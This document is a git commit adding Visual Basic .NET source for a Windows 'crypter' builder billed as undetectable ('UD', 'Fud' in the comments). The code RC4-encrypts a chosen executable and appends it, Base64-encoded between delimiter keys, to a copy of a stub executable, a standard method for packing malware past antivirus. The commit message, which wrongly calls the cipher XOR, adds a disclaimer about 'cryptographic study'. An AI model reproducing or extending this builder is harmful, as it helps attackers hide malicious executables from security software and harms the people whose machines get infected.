84ef8c3ccfa7086eb5b47ec73296921e5a545f01
neoz11 <neoz11@protonmail.com>
2017-07-16 02:18:37 +0200

    Crypter By Neoz11
    This is Crypter designer UD
    
    I use XOR Crypt the file.
    
    Instructions:
    
    Open project CrypterNeoz11 and compile work WindowsApplication3
    
    Compiling Stub Work
    
    Open compilation WindowsApplications3 / bin / *. Exe
    
    Select the file to be encrypted and select the generated stub file
    
    Select the number of random key in value 50 important for it to work
    
    Click on Random Key and encrypt the file.
    
    This work is designed for cryptographic study purposes, I am not responsible for its misuse

---
+++ WindowsApplication3/Form1.Designer.vb
@@ -0,0 +1,162 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form reemplaza a Dispose para limpiar la lista de componentes.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Requerido por el Diseñador de Windows Forms
+    Private components As System.ComponentModel.IContainer
+
+    'NOTA: el Diseñador de Windows Forms necesita el siguiente procedimiento
+    'Se puede modificar usando el Diseñador de Windows Forms.  
+    'No lo modifique con el editor de código.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.Button3 = New System.Windows.Forms.Button()
+        Me.Button4 = New System.Windows.Forms.Button()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.TextBox2 = New System.Windows.Forms.TextBox()
+        Me.TextBox3 = New System.Windows.Forms.TextBox()
+        Me.TextBox4 = New System.Windows.Forms.TextBox()
+        Me.TextBox5 = New System.Windows.Forms.TextBox()
+        Me.NumericUpDown1 = New System.Windows.Forms.NumericUpDown()
+        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'Button1
+        '
+        Me.Button1.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Button1.Location = New System.Drawing.Point(12, 10)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(99, 23)
+        Me.Button1.TabIndex = 0
+        Me.Button1.Text = "OPEN"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'Button2
+        '
+        Me.Button2.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Button2.Location = New System.Drawing.Point(12, 45)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(99, 23)
+        Me.Button2.TabIndex = 1
+        Me.Button2.Text = "STUB"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'Button3
+        '
+        Me.Button3.Font = New System.Drawing.Font("Microsoft Sans Serif", 15.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Button3.Location = New System.Drawing.Point(12, 84)
+        Me.Button3.Name = "Button3"
+        Me.Button3.Size = New System.Drawing.Size(623, 41)
+        Me.Button3.TabIndex = 2
+        Me.Button3.Text = "ENCRIPTAR"
+        Me.Button3.UseVisualStyleBackColor = True
+        '
+        'Button4
+        '
+        Me.Button4.Location = New System.Drawing.Point(12, 131)
+        Me.Button4.Name = "Button4"
+        Me.Button4.Size = New System.Drawing.Size(99, 72)
+        Me.Button4.TabIndex = 3
+        Me.Button4.Text = "GENERADOR KEYS"
+        Me.Button4.UseVisualStyleBackColor = True
+        '
+        'TextBox1
+        '
+        Me.TextBox1.BackColor = System.Drawing.SystemColors.Window
+        Me.TextBox1.Location = New System.Drawing.Point(117, 10)
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(518, 20)
+        Me.TextBox1.TabIndex = 4
+        '
+        'TextBox2
+        '
+        Me.TextBox2.Location = New System.Drawing.Point(117, 48)
+        Me.TextBox2.Name = "TextBox2"
+        Me.TextBox2.Size = New System.Drawing.Size(518, 20)
+        Me.TextBox2.TabIndex = 5
+        '
+        'TextBox3
+        '
+        Me.TextBox3.BackColor = System.Drawing.SystemColors.ControlLightLight
+        Me.TextBox3.Location = New System.Drawing.Point(117, 131)
+        Me.TextBox3.Name = "TextBox3"
+        Me.TextBox3.Size = New System.Drawing.Size(518, 20)
+        Me.TextBox3.TabIndex = 6
+        '
+        'TextBox4
+        '
+        Me.TextBox4.BackColor = System.Drawing.SystemColors.ControlLightLight
+        Me.TextBox4.Location = New System.Drawing.Point(117, 158)
+        Me.TextBox4.Name = "TextBox4"
+        Me.TextBox4.Size = New System.Drawing.Size(518, 20)
+        Me.TextBox4.TabIndex = 7
+        '
+        'TextBox5
+        '
+        Me.TextBox5.BackColor = System.Drawing.SystemColors.ControlLightLight
+        Me.TextBox5.Location = New System.Drawing.Point(117, 183)
+        Me.TextBox5.Name = "TextBox5"
+        Me.TextBox5.Size = New System.Drawing.Size(439, 20)
+        Me.TextBox5.TabIndex = 8
+        '
+        'NumericUpDown1
+        '
+        Me.NumericUpDown1.Location = New System.Drawing.Point(562, 183)
+        Me.NumericUpDown1.Maximum = New Decimal(New Integer() {-1530494977, 232830, 0, 0})
+        Me.NumericUpDown1.Name = "NumericUpDown1"
+        Me.NumericUpDown1.Size = New System.Drawing.Size(73, 20)
+        Me.NumericUpDown1.TabIndex = 9
+        Me.NumericUpDown1.Value = New Decimal(New Integer() {20, 0, 0, 0})
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackgroundImage = CType(resources.GetObject("$this.BackgroundImage"), System.Drawing.Image)
+        Me.ClientSize = New System.Drawing.Size(649, 216)
+        Me.Controls.Add(Me.NumericUpDown1)
+        Me.Controls.Add(Me.TextBox5)
+        Me.Controls.Add(Me.TextBox4)
+        Me.Controls.Add(Me.TextBox3)
+        Me.Controls.Add(Me.TextBox2)
+        Me.Controls.Add(Me.TextBox1)
+        Me.Controls.Add(Me.Button4)
+        Me.Controls.Add(Me.Button3)
+        Me.Controls.Add(Me.Button2)
+        Me.Controls.Add(Me.Button1)
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.Name = "Form1"
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "CRYPTER BY NEOZ11"
+        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents Button1 As Button
+    Friend WithEvents Button2 As Button
+    Friend WithEvents Button3 As Button
+    Friend WithEvents Button4 As Button
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents TextBox2 As TextBox
+    Friend WithEvents TextBox3 As TextBox
+    Friend WithEvents TextBox4 As TextBox
+    Friend WithEvents TextBox5 As TextBox
+    Friend WithEvents NumericUpDown1 As NumericUpDown
+End Class
---
+++ WindowsApplication3/Form1.vb
@@ -0,0 +1,162 @@
+﻿
+'''''''''''''''Feito em Visual Studio 2015''''''''''''''
+'''''''''''''''Coded e Criador Do Gerador Pjoao1578'''''
+'''''''''''''''coded  Dzkiller''''''''''''''''''''''''''
+'''''''''''''''Coded Fud Mario''''''''''''''''''''''''''
+''''''''''''''''Carlos.DF'''''''''''''''''''''''''''''''
+'''''''''''''''Modificado Por Pjoao1578'''''''''''''''''
+'''''''''''''''Cliente CR4 v2'''''''''''''''''''''''''''
+'''''''''''''''27/04/2015'''''''''''''''''''''''''''''''
+Imports System.IO
+Imports Microsoft.VisualBasic.CompilerServices
+Public Class Form1
+    Const Dzkiller1 = "~-拉彩弗集力薩歐個凸彩闕達拉莫力法巧愛日小旅彩供動里姐薩卡梅瑪蒂里普阿阿嗖韋出闕酒韋薩托會勢嗖拉旅供旅-~" 'senha 01
+    Const Dzkiller2 = "~-闕波問姐拉月盟德嗖薩力盟盟伊出止薩莫馬力旅淖托托供拉受酒淖莫歐納盟里塔室莫普作比月費拉蒂里勢蒂莫馬月-~" 'senha 02
+    Dim Dz1, Dz2 As Boolean
+    Dim cadena1 As String = "147852369014785023698514785429" 'Rodom Strigs
+    Dim cadena2 As String = "QWERTYUIOPMNBVCqwsadfghjklçpgs" 'Rodom Strigs 02
+    Dim cadena3 As String = "اییమایاုခی森ుంی帕میమုకုంခک帕တုزی奇" 'Rodom Strigs 03
+    Dim RandomClass As New Random()
+    Dim Algeria As SaveFileDialog = New SaveFileDialog
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        TextBox3.Text = cadena1
+        TextBox4.Text = cadena3
+        TextBox5.Text = cadena2
+    End Sub
+
+    Public Function rnd3(ByVal longitud As Integer) As String 'Rodom strigs 'Rodom strigs
+        Dim cadena As String = "abcdefghijklmnopqrstuvwxyzA莫တခం帕یکస帕కیుںیںاငంBCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+        Dim r As New Random
+        Dim l As Integer
+        Dim sb As New System.Text.StringBuilder
+        For i = 1 To longitud
+            l = r.Next(0, 62)
+            sb.Append(cadena.Substring(l, 1))
+        Next
+
+        Return sb.ToString()
+    End Function
+    Public Function rnd4(ByVal longitud As Integer) As String 'Rodom strigs 'Rodom strigs
+        Dim cadena As String = "abcdefghijklmnopqrstuvwxyzA莫တခం帕یکసزایుںیںاငంBCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+        Dim r As New Random
+        Dim l As Integer
+        Dim sb As New System.Text.StringBuilder
+        For i = 1 To longitud
+            l = r.Next(0, 62)
+            sb.Append(cadena.Substring(l, 1))
+        Next
+
+        Return sb.ToString()
+    End Function
+    Public Function rnd5(ByVal longitud As Integer) As String 'Rodom strigs 'Rodom strigs
+        Dim cadena As String = "abcdefghijklmnopqrstuvwxyz莫တခం帕ی帕కیుںیںاငంABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+        Dim r As New Random
+        Dim l As Integer
+        Dim sb As New System.Text.StringBuilder
+        For i = 1 To longitud
+            l = r.Next(0, 62)
+            sb.Append(cadena.Substring(l, 1))
+        Next
+
+        Return sb.ToString()
+    End Function
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
+      {
+.Filter = "Portable Executable |*.exe"
+      }
+        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
+            Me.TextBox1.Text = openFileDialog.FileName
+        End If
+    End Sub
+
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
+       {
+.Filter = "Portable Executable |*.exe"
+}
+        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
+            Me.TextBox2.Text = openFileDialog.FileName
+        End If
+    End Sub
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+        Dim Dzkiller As String
+        If ((Me.TextBox1.Text = Nothing) Or (Me.TextBox2.Text = Nothing)) Then
+            Interaction.MsgBox("Arquivos Errados Erro !", MsgBoxStyle.Information, Nothing)
+        End If
+        Try
+            Using Algeria
+                Algeria.Filter = "Executable Files (.exe)|*.exe"
+                If (Algeria.ShowDialog = DialogResult.OK) Then
+                    Dzkiller = Algeria.FileName
+                Else
+                    Return
+                End If
+            End Using
+            Dim Alpha As Byte() = RC4pjoao1578(My.Computer.FileSystem.ReadAllBytes(TextBox1.Text), Dzkiller1)
+            File.Copy(Me.TextBox2.Text, Dzkiller)
+            IO.File.AppendAllText(Dzkiller, Dzkiller2 & Convert.ToBase64String(Alpha) & Dzkiller2 & Me.TextBox3.Text & Dzkiller2 & Dz1 & Dzkiller2 & Dz2)
+            Interaction.MsgBox("Success Protection", MsgBoxStyle.Information, Nothing)
+
+        Catch exception As System.Exception
+            ProjectData.SetProjectError(exception)
+            Interaction.MsgBox("Erro !", MsgBoxStyle.Critical, Nothing)
+            ProjectData.ClearProjectError()
+        End Try
+    End Sub
+    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
+        'gerar Keys Rodom
+        For i = 0 To 15
+            System.Threading.Thread.Sleep(15)
+            Application.DoEvents()
+            TextBox3.Text = rnd3(NumericUpDown1.Value)
+        Next
+        For i = 0 To 15
+            System.Threading.Thread.Sleep(15)
+            Application.DoEvents()
+            TextBox4.Text = rnd4(NumericUpDown1.Value)
+        Next
+        For i = 0 To 15
+            System.Threading.Thread.Sleep(15)
+            Application.DoEvents()
+            TextBox5.Text = rnd5(NumericUpDown1.Value)
+        Next
+    End Sub
+
+    Public Function RC4pjoao1578(ByVal Input As Byte(), ByVal Keys As String) As Byte() 'RC4
+
+
+        Dim key As Byte() = System.Text.Encoding.ASCII.GetBytes(Keys)
+        Dim i, j, swap As UInteger
+        Dim s As UInteger() = New UInteger(255) {}
+        Dim Output As Byte() = New Byte(Input.Length - 1) {}
+
+        For i = 0 To 255
+            s(i) = i
+        Next
+
+        For i = 0 To 255
+            j = (j + key(i Mod key.Length) + s(i)) And 255
+            swap = s(i)
+            s(i) = s(j)
+            s(j) = swap
+        Next
+
+        i = 0 : j = 0
+        Dim c As Integer
+        For c = 0 To Output.Length - 1
+            i = (i + 1) And 255
+            j = (j + s(i)) And 255
+            swap = s(i)
+            s(i) = s(j)
+            s(j) = swap
+            Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
+        Next
+        Return Output
+    End Function
+
+End Class
